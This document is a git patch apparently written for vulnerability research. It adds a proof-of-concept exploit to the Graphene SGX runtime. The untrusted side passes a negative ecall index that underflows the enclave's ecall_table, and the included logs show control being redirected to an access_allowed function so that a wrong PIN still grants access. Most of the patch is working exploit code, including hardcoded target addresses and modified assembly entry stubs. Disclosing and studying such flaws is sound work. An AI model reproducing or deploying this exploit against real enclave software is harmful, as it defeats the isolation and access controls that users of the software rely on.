From 49416d26e69a68d131b8113b70fc2bc15e4d8eac Mon Sep 17 00:00:00 2001
From: Jo Van Bulck <jo.vanbulck@cs.kuleuven.be>
Date: Tue, 20 Dec 2016 14:08:07 +0100
Subject: [PATCH 2/3] Proof-of-concept exploit for ecall_table underflow in
 trusted enclave entry stub.

Untrusted runtime was modified to provide a negative entry index that redirect
control to the running application's allow_access function pointer. Also includes
minimal changes to the trusted intra-enclave runtime for debugging purposes.
---
 LibOS/shim/test/apps/hello/helloworld.c            |  7 +++
 LibOS/shim/test/apps/hello/logs/correct_idx.txt    |  0
 LibOS/shim/test/apps/hello/logs/correct_pin.txt    | 60 ++++++++++++++++++++
 .../apps/hello/logs/exploit_ecall_table_idx.txt    | 65 ++++++++++++++++++++++
 Pal/src/host/Linux-SGX/enclave_ecalls.c            | 23 ++++++++
 Pal/src/host/Linux-SGX/enclave_entry.S             | 12 +++-
 Pal/src/host/Linux-SGX/enclave_ocalls.c            | 13 +++++
 Pal/src/host/Linux-SGX/enclave_ocalls.h            |  2 +
 Pal/src/host/Linux-SGX/ocall_types.h               |  5 ++
 Pal/src/host/Linux-SGX/sgx_enclave.c               | 48 ++++++++++++++++
 Pal/src/host/Linux-SGX/sgx_main.c                  |  4 +-
 11 files changed, 235 insertions(+), 4 deletions(-)
 create mode 100644 LibOS/shim/test/apps/hello/logs/correct_idx.txt
 create mode 100644 LibOS/shim/test/apps/hello/logs/correct_pin.txt
 create mode 100644 LibOS/shim/test/apps/hello/logs/exploit_ecall_table_idx.txt

diff --git a/LibOS/shim/test/apps/hello/helloworld.c b/LibOS/shim/test/apps/hello/helloworld.c
index b2a1a44..57903b7 100644
--- a/LibOS/shim/test/apps/hello/helloworld.c
+++ b/LibOS/shim/test/apps/hello/helloworld.c
@@ -1,6 +1,13 @@
 /*
  * Elementary dummy application that features a struct with 2 function pointers,
  * and decides access by comparing a user-provided number with a secret PIN.
+ *
+ * Exploit passes out-of-bounds entry index to enclave_entry.S to underflow
+ * ecall_table, so as to redirect control via access_allowed function pointer.
+ *
+ * NOTE: exploit could even redirect control to arbitrary in-enclave addresses
+ * by underflowing the ecall_table to the memory location that contains the
+ * result of get_user_pin()..
  */
 #include <stdio.h>
 #include <fcntl.h>
diff --git a/LibOS/shim/test/apps/hello/logs/correct_idx.txt b/LibOS/shim/test/apps/hello/logs/correct_idx.txt
new file mode 100644
index 0000000..e69de29
diff --git a/LibOS/shim/test/apps/hello/logs/correct_pin.txt b/LibOS/shim/test/apps/hello/logs/correct_pin.txt
new file mode 100644
index 0000000..297bea6
--- /dev/null
+++ b/LibOS/shim/test/apps/hello/logs/correct_pin.txt
@@ -0,0 +1,60 @@
++ exec /home/jo/graphene-clone/Pal/src/pal helloworld
+manifest file: file:helloworld.manifest.sgx
+enclave created:
+    base:         0x0000000000000000
+    size:         0x10000000
+    attr:         0x0000000000000007
+    xfrm:         0x0000000000000007
+    ssaframesize: 1
+    isvprodid:    0x00000000
+    isvsvn:       0x00000000
+User addr e0902000, addr ffff000 (0, ffff000), skip_eexten 0
+adding page  to enclave: 000000000ffff000 [REG:R--] (manifest) measured
+User addr 0, addr fff6000 (0, fff6000), skip_eexten 1
+adding pages to enclave: 000000000fff6000-000000000fffe000 [REG:RW-] (ssa)
+User addr e08ff000, addr fff1000 (0, fff1000), skip_eexten 1
+adding pages to enclave: 000000000fff1000-000000000fff5000 [TCS:---] (tcs)
+User addr e08ff000, addr ffec000 (0, ffec000), skip_eexten 1
+adding pages to enclave: 000000000ffec000-000000000fff0000 [REG:RW-] (tls)
+User addr 0, addr ffdb000 (0, ffdb000), skip_eexten 1
+adding pages to enclave: 000000000ffdb000-000000000ffeb000 [REG:RW-] (stack)
+User addr 0, addr ffca000 (0, ffca000), skip_eexten 1
+adding pages to enclave: 000000000ffca000-000000000ffda000 [REG:RW-] (stack)
+User addr 0, addr ffb9000 (0, ffb9000), skip_eexten 1
+adding pages to enclave: 000000000ffb9000-000000000ffc9000 [REG:RW-] (stack)
+User addr 0, addr ffa8000 (0, ffa8000), skip_eexten 1
+adding pages to enclave: 000000000ffa8000-000000000ffb8000 [REG:RW-] (stack)
+User addr e08bc000, addr bd77000 (0, bd77000), skip_eexten 0
+adding pages to enclave: 000000000bd77000-000000000bda5000 [REG:R-X] (code) measured
+User addr e0901000, addr bfa4000 (0, bfa4000), skip_eexten 0
+adding pages to enclave: 000000000bfa4000-000000000bfa6000 [REG:RW-] (data) measured
+User addr 0, addr bfa6000 (0, bfa6000), skip_eexten 1
+adding pages to enclave: 000000000bfa6000-000000000ffa7000 [REG:RW-] (bss)
+User addr e0902000, addr 400000 (0, 400000), skip_eexten 0
+adding page  to enclave: 0000000000400000 [REG:RWX] (code) measured
+User addr e0901000, addr 600000 (0, 600000), skip_eexten 0
+adding pages to enclave: 0000000000600000-0000000000602000 [REG:RW-] (data) measured
+User addr 0, addr 602000 (0, 602000), skip_eexten 1
+adding pages to enclave: 0000000000602000-000000000bd76000 [REG:RWX] (free)
+User addr 0, addr 10000 (0, 10000), skip_eexten 1
+adding pages to enclave: 0000000000010000-0000000000400000 [REG:RWX] (free)
+enclave initializing:
+    enclave id:   0x000000000ffff000
+    enclave hash: 7f 7e c0 b7 d5 71 97 6e e1 e8 3c 99 f1 30 44 ec b7 d6 9d 06 27 81 b6 18 30 a6 34 95 8e 79 0e ca
+enclave (software) key hash: 1e28466945c66ca579408bd2c14adc53c2a9821aa1ce9ef7a07c71e5c652ecd
+trusted: [1] 7d5f3f23c7bfad547bd647f28f582c73eb17d753d2132e289f944d09eb33eeeb file:helloworld
+trusted: [2] 27520b21d5a9b681deb947f51ff0eaa62bda661df6aac65e7d356b17a250bd8f file:../../../src/libsysdb.so
+trusted: [3] 8221248333d159a13e4fee71e622f805fe4ebcf33708ae84ce8d702312bd3b5e file:../../../../glibc-build/ld-linux-x86-64.so.2
+trusted: [4] 9ce5738cc5fba2c9ec4d9922b2008d99f62c5f7d644bcd8187c2ea13f0ba7157 file:../../../../glibc-build/libc.so.6
+passing thread_start
+
+
+
+Hello world from enclaved application binary!
+	--> ac.allowAccess at 0x601078 is 0x4007e1 (access_allowed_handler)
+app: enter PIN..
+> 1234
+user entered 1234
+app: checking acess..
+===> app: access allowed! <===
+destroying enclave...
diff --git a/LibOS/shim/test/apps/hello/logs/exploit_ecall_table_idx.txt b/LibOS/shim/test/apps/hello/logs/exploit_ecall_table_idx.txt
new file mode 100644
index 0000000..5bcbbfa
--- /dev/null
+++ b/LibOS/shim/test/apps/hello/logs/exploit_ecall_table_idx.txt
@@ -0,0 +1,65 @@
++ exec /home/jo/graphene-clone/Pal/src/pal helloworld
+manifest file: file:helloworld.manifest.sgx
+enclave created:
+    base:         0x0000000000000000
+    attr:         0x0000000000000007
+    xfrm:         0x0000000000000007
+    ssaframesize: 1
+    isvprodid:    0x00000000
+    isvsvn:       0x00000000
+User addr 8b09e000, addr ffff000 (0, ffff000), skip_eexten 0
+adding page  to enclave: 000000000ffff000 [REG:R--] (manifest) measured
+User addr 0, addr fff6000 (0, fff6000), skip_eexten 1
+adding pages to enclave: 000000000fff6000-000000000fffe000 [REG:RW-] (ssa)
+User addr 8b09b000, addr fff1000 (0, fff1000), skip_eexten 1
+adding pages to enclave: 000000000fff1000-000000000fff5000 [TCS:---] (tcs)
+User addr 8b09b000, addr ffec000 (0, ffec000), skip_eexten 1
+adding pages to enclave: 000000000ffec000-000000000fff0000 [REG:RW-] (tls)
+User addr 0, addr ffdb000 (0, ffdb000), skip_eexten 1
+adding pages to enclave: 000000000ffdb000-000000000ffeb000 [REG:RW-] (stack)
+User addr 0, addr ffca000 (0, ffca000), skip_eexten 1
+adding pages to enclave: 000000000ffca000-000000000ffda000 [REG:RW-] (stack)
+User addr 0, addr ffb9000 (0, ffb9000), skip_eexten 1
+adding pages to enclave: 000000000ffb9000-000000000ffc9000 [REG:RW-] (stack)
+User addr 0, addr ffa8000 (0, ffa8000), skip_eexten 1
+adding pages to enclave: 000000000ffa8000-000000000ffb8000 [REG:RW-] (stack)
+User addr 8b058000, addr bd77000 (0, bd77000), skip_eexten 0
+adding pages to enclave: 000000000bd77000-000000000bda5000 [REG:R-X] (code) measured
+User addr 8b09d000, addr bfa4000 (0, bfa4000), skip_eexten 0
+adding pages to enclave: 000000000bfa4000-000000000bfa6000 [REG:RW-] (data) measured
+User addr 0, addr bfa6000 (0, bfa6000), skip_eexten 1
+adding pages to enclave: 000000000bfa6000-000000000ffa7000 [REG:RW-] (bss)
+User addr 8b09e000, addr 400000 (0, 400000), skip_eexten 0
+adding page  to enclave: 0000000000400000 [REG:RWX] (code) measured
+User addr 8b09d000, addr 600000 (0, 600000), skip_eexten 0
+adding pages to enclave: 0000000000600000-0000000000602000 [REG:RW-] (data) measured
+User addr 0, addr 602000 (0, 602000), skip_eexten 1
+adding pages to enclave: 0000000000602000-000000000bd76000 [REG:RWX] (free)
+User addr 0, addr 10000 (0, 10000), skip_eexten 1
+adding pages to enclave: 0000000000010000-0000000000400000 [REG:RWX] (free)
+enclave initializing:
+    enclave id:   0x000000000ffff000
+    enclave hash: 7f 7e c0 b7 d5 71 97 6e e1 e8 3c 99 f1 30 44 ec b7 d6 9d 06 27 81 b6 18 30 a6 34 95 8e 79 0e ca
+enclave (software) key hash: 1401418bbf30ed49028a4cfe6db93aad5332369610c4740562d8641671093c1
+trusted: [1] 7d5f3f23c7bfad547bd647f28f582c73eb17d753d2132e289f944d09eb33eeeb file:helloworld
+trusted: [2] 27520b21d5a9b681deb947f51ff0eaa62bda661df6aac65e7d356b17a250bd8f file:../../../src/libsysdb.so
+trusted: [3] 8221248333d159a13e4fee71e622f805fe4ebcf33708ae84ce8d702312bd3b5e file:../../../../glibc-build/ld-linux-x86-64.so.2
+trusted: [4] 9ce5738cc5fba2c9ec4d9922b2008d99f62c5f7d644bcd8187c2ea13f0ba7157 file:../../../../glibc-build/libc.so.6
+passing thread_start
+
+
+
+Hello world from enclaved application binary!
+	--> ac.allowAccess at 0x601078 is 0x4007e1 (access_allowed_handler)
+app: enter PIN..
+> 1233
+user entered 1233
+app: checking acess..
+===> app: access denied! <===
+app: opening dummy_file
+
+[urts] entering enclave with illegal ecall idx -24332361 (ecall_table_adrs=0xbfa52c0)
+enclave_handle_ecall: asm stub passed function pointer:
+[ocall_dump] 0x4007e1
+===> app: access allowed! <===
+destroying enclave...
diff --git a/Pal/src/host/Linux-SGX/enclave_ecalls.c b/Pal/src/host/Linux-SGX/enclave_ecalls.c
index 727cd64..fe1206b 100644
--- a/Pal/src/host/Linux-SGX/enclave_ecalls.c
+++ b/Pal/src/host/Linux-SGX/enclave_ecalls.c
@@ -14,6 +14,29 @@ extern void * enclave_base, * enclave_top;
 void pal_linux_main (const char ** arguments, const char ** environments,
                      struct pal_sec * sec_info);
 
+int enclave_ecall_thread_start (void * pms);
+
+/*
+ * PoC: asm stub redirects control to this function to allow debugging..
+ */
+int enclave_handle_ecall(void * pms, void (*fct)(void))
+{
+    if (fct == &enclave_ecall_thread_start)
+    {
+        char *str = "passing thread_start\n\n";
+        ocall_print_string(str, strlen(str));
+        
+        return enclave_ecall_thread_start(pms);
+    }
+
+    char *str = "enclave_handle_ecall: asm stub passed function pointer:\n";
+    ocall_print_string(str, strlen(str));
+    ocall_dump(fct);
+    fct();
+    
+    ocall_exit();
+}
+
 int enclave_ecall_pal_main (void * pms)
 {
     ms_ecall_pal_main_t * ms = SGX_CAST(ms_ecall_pal_main_t *, pms);
diff --git a/Pal/src/host/Linux-SGX/enclave_entry.S b/Pal/src/host/Linux-SGX/enclave_entry.S
index f5f068f..971106d 100644
--- a/Pal/src/host/Linux-SGX/enclave_entry.S
+++ b/Pal/src/host/Linux-SGX/enclave_entry.S
@@ -3,6 +3,7 @@
 
 	.extern ecall_table
 	.extern enclave_ecall_pal_main
+	.extern enclave_handle_ecall
 
 	.global enclave_entry
 	.type enclave_entry, @function
@@ -35,7 +36,9 @@ enclave_entry:
 	jne .Lhandle_ecall
 
 	lea enclave_ecall_pal_main(%rip), %rbx
-	jmp .Lcall_ecall
+	#jmp .Lcall_ecall
+	mov %rsi, %rdi
+	call *%rbx
 
 .Lhandle_ecall:
 	lea ecall_table(%rip), %rbx
@@ -43,8 +46,11 @@ enclave_entry:
 
 .Lcall_ecall:
 	mov %rsi, %rdi
-	call *%rbx
-
+	#call *%rbx
+	
+	mov %rbx, %rsi
+	call enclave_handle_ecall
+	
 	# never return to this point (should die)
 	xor %rdi, %rdi
 	xor %rsi, %rsi
diff --git a/Pal/src/host/Linux-SGX/enclave_ocalls.c b/Pal/src/host/Linux-SGX/enclave_ocalls.c
index fe3c801..fb1435d 100644
--- a/Pal/src/host/Linux-SGX/enclave_ocalls.c
+++ b/Pal/src/host/Linux-SGX/enclave_ocalls.c
@@ -814,3 +814,16 @@ int ocall_load_debug(const char * command)
     OCALL_EXIT();
     return retval;
 }
+
+int ocall_dump(uint64_t arg)
+{
+    int retval = 0;
+    ms_ocall_dump_t *ms;
+    OCALLOC(ms, ms_ocall_dump_t *, sizeof(*ms));
+    
+    ms->arg = arg;
+    
+    retval = SGX_OCALL(OCALL_DUMP, ms);
+    OCALL_EXIT();
+    return retval;
+}
diff --git a/Pal/src/host/Linux-SGX/enclave_ocalls.h b/Pal/src/host/Linux-SGX/enclave_ocalls.h
index e8367f4..ed36b20 100644
--- a/Pal/src/host/Linux-SGX/enclave_ocalls.h
+++ b/Pal/src/host/Linux-SGX/enclave_ocalls.h
@@ -11,6 +11,8 @@
 #include <linux/socket.h>
 #include <linux/poll.h>
 
+int ocall_dump(uint64_t);
+
 int ocall_exit (void);
 
 int ocall_print_string (const char * str, unsigned int length);
diff --git a/Pal/src/host/Linux-SGX/ocall_types.h b/Pal/src/host/Linux-SGX/ocall_types.h
index 706d5c5..f89d777 100644
--- a/Pal/src/host/Linux-SGX/ocall_types.h
+++ b/Pal/src/host/Linux-SGX/ocall_types.h
@@ -47,6 +47,7 @@ enum {
     OCALL_DELETE,
     OCALL_SCHEDULE,
     OCALL_LOAD_DEBUG,
+    OCALL_DUMP,
     OCALL_NR,
 };
 
@@ -269,3 +270,7 @@ typedef struct {
 typedef struct {
     unsigned int ms_tid;
 } ms_ocall_schedule_t;
+
+typedef struct {
+    uint64_t arg;
+} ms_ocall_dump_t;
diff --git a/Pal/src/host/Linux-SGX/sgx_enclave.c b/Pal/src/host/Linux-SGX/sgx_enclave.c
index 659f057..a48030d 100644
--- a/Pal/src/host/Linux-SGX/sgx_enclave.c
+++ b/Pal/src/host/Linux-SGX/sgx_enclave.c
@@ -20,6 +20,8 @@
 
 #define ODEBUG(code, ms) do {} while (0)
 
+int ecall_illegal(void);
+
 static int sgx_ocall_exit(void * pms)
 {
     ODEBUG(OCALL_EXIT, NULL);
@@ -92,6 +94,17 @@ static int sgx_ocall_open(void * pms)
 {
     ms_ocall_open_t * ms = (ms_ocall_open_t *) pms;
     int ret;
+
+    //*XXX enclaved victim binary has started, launch ecall attack.
+    char *target = "./dummy_file";
+    #define MIN(X, Y) (((X) < (Y)) ? (X) : (Y))
+    int len = MIN(strlen(target), strlen(ms->ms_pathname));
+    
+    if (strncmp(target, ms->ms_pathname, len) == 0)
+    {
+        ecall_illegal();
+    }//*
+
     ODEBUG(OCALL_OPEN, ms);
     ret = INLINE_SYSCALL(open, 3, ms->ms_pathname, ms->ms_flags|O_CLOEXEC,
                          ms->ms_mode);
@@ -653,6 +666,15 @@ static int sgx_ocall_load_debug(void * pms)
     return 0;
 }
 
+static int sgx_ocall_dump(void *pms)
+{
+    ms_ocall_dump_t * ms = (ms_ocall_dump_t *) pms;
+
+    printf("[ocall_dump] %p\n", ms->arg);
+    
+    return 0;
+}
+
 void * ocall_table[OCALL_NR] = {
         [OCALL_EXIT]            = (void *) sgx_ocall_exit,
         [OCALL_PRINT_STRING]    = (void *) sgx_ocall_print_string,
@@ -693,6 +715,7 @@ void * ocall_table[OCALL_NR] = {
         [OCALL_DELETE]          = (void *) sgx_ocall_delete,
         [OCALL_SCHEDULE]        = (void *) sgx_ocall_schedule,
         [OCALL_LOAD_DEBUG]      = (void *) sgx_ocall_load_debug,
+        [OCALL_DUMP]            = (void *) sgx_ocall_dump,
     };
 
 #define EDEBUG(code, ms) do {} while (0)
@@ -713,6 +736,31 @@ int ecall_pal_main (const char ** arguments, const char ** environments)
     return sgx_ecall(ECALL_PAL_MAIN, &ms);
 }
 
+//XXX retrieve addresses with `objdump libpal-enclave.so / helloworld`
+#define ECALL_TABLE_ADRS        (0x22e2c0)
+#define TARGET_ADRS             (0x601078)
+
+extern struct pal_sec * pal_sec;
+
+int ecall_illegal (void)
+{
+    /* 
+     * Trusted enclave_entry.S code does not check whether provided entry
+     * index is within the bounds of the intra-enclave ecall_table. We can
+     * exploit arbitrary function pointers within the enclave by overflowing
+     * the table with a positive/negative index.
+     *
+     * Entry code also allows untrusted caller to make a return ecall in an
+     * enclave thread that is not waiting for a return from a previous ocall.  
+     */
+    uint64_t ecall_table_adrs = pal_sec->enclave_addr + ECALL_TABLE_ADRS;
+    int enr = (TARGET_ADRS - ecall_table_adrs) / 8; /*ECALL_NR*/ /*RETURN_FROM_OCALL*/
+    printf("\n[urts] entering enclave with illegal ecall idx %d (ecall_table_adrs=%p)\n",
+        enr, ecall_table_adrs);
+
+    return sgx_ecall(enr, NULL);
+}
+
 int ecall_thread_start (void (*func) (void *), void * arg,
                         unsigned int * child_tid, unsigned int tid)
 {
diff --git a/Pal/src/host/Linux-SGX/sgx_main.c b/Pal/src/host/Linux-SGX/sgx_main.c
index 8b65b51..f2971b1 100644
--- a/Pal/src/host/Linux-SGX/sgx_main.c
+++ b/Pal/src/host/Linux-SGX/sgx_main.c
@@ -229,6 +229,8 @@ int load_enclave_binary (sgx_arch_secs_t * secs, int fd,
     return 0;
 }
 
+struct pal_sec * pal_sec = NULL;
+
 int initialize_enclave (struct pal_enclave * enclave)
 {
     int ret = 0;
@@ -460,7 +462,7 @@ add_pages:
     create_tcs_mapper((void *) enclave_secs.baseaddr + tcs_area->addr,
                       enclave->thread_num);
 
-    struct pal_sec * pal_sec = &enclave->pal_sec;
+    pal_sec = &enclave->pal_sec;
 
     pal_sec->enclave_addr = (PAL_PTR) (enclave_secs.baseaddr + pal_area->addr);
 
-- 
2.7.4

